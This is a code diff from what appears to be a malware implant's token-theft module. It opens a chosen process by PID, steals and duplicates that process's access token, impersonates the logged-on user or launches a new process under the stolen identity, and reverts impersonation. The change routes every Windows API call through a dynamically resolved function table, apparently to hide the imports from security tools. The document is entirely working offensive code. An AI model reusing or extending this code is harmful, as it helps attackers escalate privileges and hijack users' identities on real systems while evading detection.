@@ -13,7 +13,7 @@ namespace Task::Helper::Token
         RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
         si.cb = sizeof(STARTUPINFOW);
 
-        bResults = DuplicateTokenEx(
+        bResults = pProcs->lpDuplicateTokenEx(
             hToken,
             MAXIMUM_ALLOWED,
             NULL,
@@ -26,7 +26,7 @@ namespace Task::Helper::Token
             return FALSE;
         }
 
-        bResults = CreateProcessWithTokenW(
+        bResults = pProcs->lpCreateProcessWithTokenW(
             hDuplToken,
             LOGON_WITH_PROFILE,
             appName,
@@ -48,9 +48,9 @@ namespace Task::Helper::Token
 
 namespace Task
 {
-    std::wstring TokenRevert()
+    std::wstring TokenRevert(State::PSTATE pState)
     {
-        if (!RevertToSelf())
+        if (!pState->pProcs->lpRevertToSelf())
         {
             return L"Error: Could not revert impersonation.";
         }
@@ -69,7 +69,7 @@ namespace Task
         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
 
         // Current user needs to have SeDebugPrivilege.
-        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrToken))
+        if (!pState->pProcs->lpOpenProcessToken(NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrToken))
         {
             return L"Error: Could not open the process token.";
         }
@@ -82,21 +82,21 @@ namespace Task
         }
 
         // Open target process token handle.
-        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, dwPid);
+        HANDLE hProcess = pState->pProcs->lpOpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, dwPid);
         if (!hProcess)
         {
             return L"Error: Failed to get target process handle.";
         }
 
         HANDLE hToken = NULL;
-        if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken))
+        if (!pState->pProcs->lpOpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken))
         {
             return L"Error: Failed to get target process token handle.";
         }
 
         if (bLogin)
         {
-            if (!ImpersonateLoggedOnUser(hToken))
+            if (!pState->pProcs->lpImpersonateLoggedOnUser(hToken))
             {
                 return L"Error: Could not logon with impersonation.";
             }
@@ -114,7 +114,7 @@ namespace Task
 
             // Get current program (implant) path.
             WCHAR wSelfPath[MAX_PATH];
-            DWORD dwResult = GetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
+            DWORD dwResult = pState->pProcs->lpGetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
             if (dwResult == 0)
             {
                 return L"Error: Failed to get the program path.";
